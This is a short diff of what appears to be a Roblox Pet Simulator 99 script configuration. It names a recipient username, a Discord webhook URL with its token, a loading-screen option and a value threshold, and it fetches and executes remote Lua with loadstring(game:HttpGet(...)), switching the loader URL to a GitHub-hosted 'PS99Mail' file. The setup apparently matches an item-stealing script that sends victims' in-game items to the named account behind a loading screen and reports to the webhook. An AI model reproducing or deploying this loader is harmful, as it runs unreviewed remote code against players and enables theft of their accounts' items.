@@ -1,9 +1,6 @@
 Username = "Mauricio_Campos5"
-Username2 = "Mauricio_Campos10"
 Webhook = "https://discord.com/api/webhooks/1212589403768102993/i6U5PIYl-auS_aNiDbXARHbQn1ux6w_jj6pSzcOaRuxKOD7Sd0bKhhV5EhdXGXXR-RbS"
-
+selectedLoadingScreen = "4"
 LoadingScreen = true
 
-MinimumRAP = 1000000
-
-loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
